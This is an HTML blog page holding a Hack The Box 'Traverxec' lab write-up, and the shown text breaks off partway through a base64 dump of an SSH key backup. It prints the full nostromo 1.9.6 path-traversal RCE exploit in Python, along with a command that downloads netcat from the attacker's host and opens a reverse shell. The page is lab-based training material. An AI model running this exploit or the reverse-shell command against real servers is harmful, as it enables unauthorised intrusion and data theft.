@@ -1,0 +1,641 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Exploiting the vulnerable nostromo version for getting initial shell and finding the hidden dir, cracking the ssh private keys to get user and running journalctl as root and exploiting the journalctl to get root shell." /><meta property="og:title" content="Hackthebox Traverxec writeup" /><meta property="og:description" content="Exploiting the vulnerable nostromo version for getting initial shell and finding the hidden dir, cracking the ssh private keys to get user and running journalctl as root and exploiting the journalctl to get root shell." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/traverxec/traverxec.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Traverxec writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Exploiting the vulnerable nostromo version for getting initial shell and finding the hidden dir, cracking the ssh private keys to get user and running journalctl as root and exploiting the journalctl to get root shell."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/traverxec/traverxec.png"><title>Hackthebox Traverxec writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Traverxec writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Traverxec writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 15, 2020, 12:00 AM +0800" > Feb 15 <i class="unloaded">2020-02-15T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traverxec/traverxec.png" class="post-preview-img"><h1 id="information">information</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Traverxec<tr><td>IP<td>10.10.10.165<tr><td>Points<td>20<tr><td>Os<td>Linux<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/77141" target="_blank">Jkr</a><tr><td>Out On<td>16 NOV 2019<tr><td>Retired on<td>11 April 2020<tr><td>creator’s Twitter<td><a href="https://twitter.com/ATeamJKR" target="_blank">@ATeamJKR</a></table></div><h1 id="brief">Brief</h1><p>Exploiting the vulnerable <code class="language-plaintext highlighter-rouge">nostromo</code> version for getting initial <code class="language-plaintext highlighter-rouge">shell</code> and finding the hidden dir, cracking the <code class="language-plaintext highlighter-rouge">ssh</code> private keys to get user and running <code class="language-plaintext highlighter-rouge">journalctl</code> as root and exploiting the <code class="language-plaintext highlighter-rouge">journalctl</code> to get root shell.</p><h1 id="summary">Summary</h1><ul><li>Nmap revelas the <code class="language-plaintext highlighter-rouge">nostromo</code> version<li>Finding an exploit for the <strong>nostromo</strong><li>Getting shell as <code class="language-plaintext highlighter-rouge">www-data</code><li>Finding a Dir called <strong>public_www</strong><li>Getting an encrypted <code class="language-plaintext highlighter-rouge">id_rsa</code><li>Cracking the id_rsa with <strong>john</strong><li>login as <code class="language-plaintext highlighter-rouge">david</code><li>Got <strong>user.txt</strong><li>Finding that We can run <code class="language-plaintext highlighter-rouge">Journalctl</code> as <strong>root</strong><li>Exploiting the <strong>Journalctl</strong><li>Got <code class="language-plaintext highlighter-rouge">root.txt</code></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/traverxec/traverxec.cast" start-at="0" autoplay="1" speed="2" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><ul><li>-sV : for Displaying service version<li>-sC : For Displaying Common-scripts availbale for that service<li>-p- : Scan for all the ports (65,535)<li>-T4 : Quick results<li>-oA : save the result in an output file</ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre><td class="rouge-code"><pre>➜  traverxec nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-p-</span> traverxec.htb <span class="nt">-oA</span> nmap.full <span class="nt">-v</span>
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-11 09:22 WIT
+NSE: Loaded 151 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 09:22
+Completed NSE at 09:22, 0.00s elapsed
+Initiating NSE at 09:22
+Completed NSE at 09:22, 0.00s elapsed
+Initiating NSE at 09:22
+Completed NSE at 09:22, 0.00s elapsed
+Initiating Ping Scan at 09:22
+Scanning traverxec.htb <span class="o">(</span>10.10.10.165<span class="o">)</span> <span class="o">[</span>4 ports]
+Completed Ping Scan at 09:22, 0.36s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 09:22
+Scanning traverxec.htb <span class="o">(</span>10.10.10.165<span class="o">)</span> <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.10.165
+Discovered open port 80/tcp on 10.10.10.165
+SYN Stealth Scan Timing: About 3.06% <span class="k">done</span><span class="p">;</span> ETC: 09:38 <span class="o">(</span>0:16:21 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 13.79% <span class="k">done</span><span class="p">;</span> ETC: 09:29 <span class="o">(</span>0:06:21 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 27.71% <span class="k">done</span><span class="p">;</span> ETC: 09:27 <span class="o">(</span>0:03:57 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 35.43% <span class="k">done</span><span class="p">;</span> ETC: 09:27 <span class="o">(</span>0:03:41 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 49.77% <span class="k">done</span><span class="p">;</span> ETC: 09:27 <span class="o">(</span>0:02:32 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 58.40% <span class="k">done</span><span class="p">;</span> ETC: 09:27 <span class="o">(</span>0:02:09 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 69.79% <span class="k">done</span><span class="p">;</span> ETC: 09:27 <span class="o">(</span>0:01:31 remaining<span class="o">)</span>
+SYN Stealth Scan Timing: About 82.97% <span class="k">done</span><span class="p">;</span> ETC: 09:26 <span class="o">(</span>0:00:49 remaining<span class="o">)</span>
+Completed SYN Stealth Scan at 09:26, 273.14s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Initiating Service scan at 09:26
+Scanning 2 services on traverxec.htb <span class="o">(</span>10.10.10.165<span class="o">)</span>
+Completed Service scan at 09:26, 6.55s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.10.165.
+Initiating NSE at 09:26
+Completed NSE at 09:26, 7.60s elapsed
+Initiating NSE at 09:26
+Completed NSE at 09:26, 1.34s elapsed
+Initiating NSE at 09:26
+Completed NSE at 09:26, 0.00s elapsed
+Nmap scan report <span class="k">for </span>traverxec.htb <span class="o">(</span>10.10.10.165<span class="o">)</span>
+Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nostromo 1.9.6
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:26
+Completed NSE at 09:26, 0.00s elapsed
+Initiating NSE at 09:26
+Completed NSE at 09:26, 0.00s elapsed
+Initiating NSE at 09:26
+Completed NSE at 09:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>290.21 seconds
+           Raw packets sent: 131248 <span class="o">(</span>5.775MB<span class="o">)</span> | Rcvd: 179 <span class="o">(</span>7.860KB<span class="o">)</span>
+</pre></table></code></div></div><p>Only two ports <code class="language-plaintext highlighter-rouge">22:ssh</code> and <code class="language-plaintext highlighter-rouge">80:http</code> opened so lets move on to port 80</p><h2 id="port-80">Port 80</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traverxec/image-1.png" alt="port-80" /></p><p>There is a web app serving on the port 80 and if we look at our nmap results the web app is running on the service <code class="language-plaintext highlighter-rouge">nostromo</code> and its current version is <code class="language-plaintext highlighter-rouge">1.9.6</code></p><h2 id="searching-for-the-nostro-exploit">Searching for the nostro exploit</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traverxec/image-2.png" alt="port-80" /></p><p>We got the exploit for the exact version of the nostromo</p><p><a href="https://www.exploit-db.com/exploits/47837" target="_blank">nostromo-exploit</a></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="n">help_menu</span> <span class="o">=</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">Usage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'</span>
+<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">):</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">connection</span> <span class="o">=</span> <span class="n">soc</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">connection</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="k">break</span>
+            <span class="n">response</span> <span class="o">+=</span> <span class="n">connection</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="n">response</span>
+<span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">art</span><span class="p">)</span>
+    
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+        <span class="n">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+   
+    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">help_menu</span><span class="p">)</span>
+</pre></table></code></div></div><h1 id="exploiting-nostromo">Exploiting nostromo</h1><p>So the exploit accept 3 <code class="language-plaintext highlighter-rouge">arguments</code></p><ul><li>Target ip<li>Target port<li>Command</ul><p>In our case the Target Ip will be <code class="language-plaintext highlighter-rouge">10.10.10.165</code> or <code class="language-plaintext highlighter-rouge">traverxec.htb</code> Target port will be 80</p><p>And the command will be downloading the nc from my python server and executing the nc to give us connection back.</p><p><strong>wget http://10.10.14.3:8080/nc /tmp/nc;chmod +x /tmp/nc;nc -e /bin/bash 10.10.14.3 1234</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traverxec/image-4.png" alt="running-exploit" /></p><p>My python server got Hitted</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>➜  Tools python <span class="nt">-m</span> http.server 8080 
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+10.10.10.165 - - <span class="o">[</span>11/Apr/2020 10:06:00] <span class="s2">"GET /nc HTTP/1.1"</span> 200 -
+</pre></table></code></div></div><p>And on our netcat listener we got a reverse shell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>➜  prashant nc <span class="nt">-nlvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165] 47662
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span>
+<span class="nv">$ </span>/bin/bash <span class="nt">-i</span>
+/bin/bash <span class="nt">-i</span>
+www-data@traverxec:/usr/bin<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+</pre></table></code></div></div><p>We got a shell as www-data</p><p>And i spawned the tty shell along with bash interactive</p><p>Running <code class="language-plaintext highlighter-rouge">LinEnum</code> Doesnt show me any useful information</p><p>Lets see if we can read some information in user <code class="language-plaintext highlighter-rouge">david</code> directory</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>www-data@traverxec:/home/david<span class="nv">$ </span><span class="nb">ls
+ls
+ls</span>: cannot open directory <span class="s1">'.'</span>: Permission denied
+www-data@traverxec:/home/david<span class="nv">$ </span>
+</pre></table></code></div></div><p>But no we are not even allowed to read the dir.</p><h1 id="public-readable-dir">Public Readable Dir</h1><p>After a manual enumeration i got a File called <code class="language-plaintext highlighter-rouge">nhttpd.conf</code> in the dir <strong>/var/nostromo/conf</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>www-data@traverxec:/var/nostromo/conf<span class="nv">$ </span><span class="nb">cat </span>nhttpd.conf
+<span class="nb">cat </span>nhttpd.conf
+<span class="c"># MAIN [MANDATORY]</span>
+servername		traverxec.htb
+serverlisten		<span class="k">*</span>
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+<span class="c"># LOGS [OPTIONAL]</span>
+logpid			logs/nhttpd.pid
+<span class="c"># SETUID [RECOMMENDED]</span>
+user			www-data
+<span class="c"># BASIC AUTHENTICATION [OPTIONAL]</span>
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+<span class="c"># ALIASES [OPTIONAL]</span>
+/icons			/var/nostromo/icons
+<span class="c"># HOMEDIRS [OPTIONAL]</span>
+homedirs		/home
+homedirs_public		public_www
+</pre></table></code></div></div><p>This file contains some very good infornation i.e a <code class="language-plaintext highlighter-rouge">public_www</code> dir in /home/david</p><p>Lets see if we can read the files in <strong>public_www</strong> dir</p><p>And Yeah we can read and list the contents of the DIR public_www</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>www-data@traverxec:/home/david/public_www<span class="nv">$ </span><span class="nb">ls
+ls
+</span>index.html  protected-file-area
+www-data@traverxec:/home/david/public_www<span class="nv">$ </span>
+</pre></table></code></div></div><p>There is a dir called <code class="language-plaintext highlighter-rouge">protected-file-area</code> lets see what is in it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>www-data@traverxec:/home/david/public_www/protected-file-area<span class="nv">$ </span><span class="nb">ls
+ls
+</span>backup-ssh-identity-files.tgz
+www-data@traverxec:/home/david/public_www/protected-file-area<span class="nv">$ </span>
+</pre></table></code></div></div><h1 id="got-a-backup-ssh-identity-filestgz">Got a backup-ssh-identity-files.tgz</h1><p>And we got a file called <code class="language-plaintext highlighter-rouge">backup-ssh-identity-files.tgz</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>www-data@traverxec:/home/david/public_www/protected-file-area<span class="nv">$ </span><span class="nb">ls
+ls
+</span>backup-ssh-identity-files.tgz
+</pre></table></code></div></div><p>I m transfering this file to my machine using base64 encoding i will encode this file in base64 format and then copy the base64 text and decode the text and save that in a backup.tgz file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>www-data@traverxec:/home/david/public_www/protected-file-area<span class="nv">$ </span><span class="nb">base64 </span>backup-ssh-identity-files.tgz
+&lt;ted-file-area<span class="nv">$ </span><span class="nb">base64 </span>backup-ssh-identity-files.tgz           
+H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
+gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
+mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE
+/w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh
+6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl
+5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84Yc
+rKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2
+r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9
+noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkL
+rCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+
+wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVW
+p6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62a
+VDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpf
+efEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNv
+GBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gS
+Ttb3C0hLo8NCKeROjz5AdL8+wc0cWPsequXeFAIZW3Q1dqfytc+krtN7vdtY5KFQ0q653kkzCwZ6
+ktebbV5OatEvF5sO+CpUVvHBUNWmWrQ8zreb70KhCRDdMwgTcDBrTnggD7BV40hl0coCYel2tGCP
+qz5DVNU+pPQW8iYe+4iAFEeacFaK92dgW48mIqoRqY2U2xTH9IShWS4Sq7AXaATPjd/JjepWxlD3
+xWDduExncmgTLLeop/4OAzaiGGpf3mi9vo4YNZ4OEsmY8kE1kZAXzSmP7SduGCG4ESw3bxfzxoh9
